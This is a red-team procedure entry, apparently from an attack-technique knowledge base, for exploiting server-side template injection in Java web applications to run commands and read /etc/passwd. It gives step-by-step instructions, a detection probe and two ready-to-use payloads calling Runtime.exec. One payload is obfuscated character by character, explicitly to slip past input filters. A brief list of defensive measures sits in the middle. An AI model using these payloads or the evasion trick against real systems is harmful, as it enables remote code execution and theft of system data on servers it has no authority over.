---
id: 1e731ab9-d9f4-443a-90e4-73ba80ef8732
name: Java-Server-Side-Template-Injection-to-Retrieve-Etc-Passwd
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.354666+00:00'
updated_at: '2023-04-10T20:23:40.023083+00:00'
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Template Injection]]'
sub_techniques: []
tags:
  - java
  - ssti
  - server-side-template-injection
  - file-read
commands: []
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# Java-Server-Side-Template-Injection-to-Retrieve-Etc-Passwd

## Summary

This procedure exploits a Server-Side Template Injection (SSTI) vulnerability in a Java-based web application to execute arbitrary code and retrieve the contents of the /etc/passwd file on the target server. By injecting malicious template expressions, an attacker can leverage Java's Runtime class to run system commands, providing insights into user accounts and system structure for further attacks.

## Description

Server-Side Template Injection occurs when user-supplied input is unsafely concatenated into a server-side template engine without proper sanitization, allowing attackers to inject and execute arbitrary expressions or code during template rendering. In Java applications using engines like FreeMarker, Thymeleaf, or JSP, this can lead to remote code execution (RCE). This procedure focuses on using Java reflection to invoke Runtime.exec() for reading sensitive files like /etc/passwd, which lists all user accounts on Unix-like systems. The attack assumes the application processes user input in a template context, such as a search field or dynamic content renderer. Successful exploitation reveals system users, UIDs, home directories, and shells, aiding in lateral movement or privilege escalation planning. The target environment is typically a Linux-hosted Java web app exposed via HTTP/HTTPS.

## Requirements

1. Valid user input point in the Java application that feeds into a server-side template engine (e.g., a form field or URL parameter).
2. Knowledge of the template engine in use (e.g., JSP, Freemarker) to craft appropriate payloads.
3. Network access to the vulnerable endpoint, often requiring no authentication if the injection point is public-facing.
4. Basic understanding of Java classes like java.lang.Runtime and org.apache.commons.io.IOUtils for payload construction.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for all user inputs destined for template engines, using whitelisting over blacklisting.
- Use parameterized queries or template-safe APIs to avoid direct concatenation of user input into templates.
- Apply least-privilege principles to the application server process, restricting file system access (e.g., via AppArmor or SELinux) to prevent reading sensitive files like /etc/passwd.
- Enable web application firewall (WAF) rules to detect common SSTI patterns, such as ${T(...)} expressions, and monitor server logs for anomalous Runtime.exec() calls.
- Regularly audit and update Java dependencies and template libraries to patch known SSTI vulnerabilities.

## Objectives

1. Inject a malicious template expression to achieve code execution on the server.
2. Execute a system command to read and return the contents of /etc/passwd.
3. Analyze the retrieved data to identify system users and potential attack vectors.

## Instructions

### Step 1: Identify the Injection Point

**Context**: Locate a user-controlled input field or parameter that is rendered via a server-side template. Test for SSTI by injecting simple expressions like ${7*7} and checking if the output is 49 instead of the literal string.

Submit the test payload via the application's form or API endpoint, such as a search box or profile update field.

> If the output reflects the calculated result, the endpoint is vulnerable to SSTI.

### Step 2: Craft and Inject the Payload

**Context**: Use a Java-specific SSTI payload to invoke Runtime.exec() for running 'cat /etc/passwd'. The payload leverages Java's Type (T) shortcut for class resolution and IOUtils for capturing command output as a string. There are two variants: a direct command and an obfuscated character-by-character construction to bypass basic filters.

**Code** ([[codes/Java-SSTI-Payload-for-Reading-Etc-Passwd]]):

Embed the payload in the vulnerable input field. For the direct variant:

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
```

For the obfuscated variant to evade simple string-based detection:

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

Submit the request (e.g., via browser, curl, or Burp Suite) and observe the response.

> The first payload executes 'cat /etc/passwd' but may not capture output visibly; the second constructs 'cat /etc/passwd' character-by-character using concat() and converts the command's input stream to a string for display in the template output.

### Step 3: Verify and Analyze Output

**Context**: Confirm successful execution by checking if the response contains user account entries from /etc/passwd, such as root:x:0:0:root:/root:/bin/bash.

Inspect the rendered page or API response for the file contents. If no output appears, try wrapping in a print or output function specific to the template engine (e.g., <#assign output=...> in Freemarker).

> Success is indicated by the presence of /etc/passwd contents in the response, revealing system users and configurations.
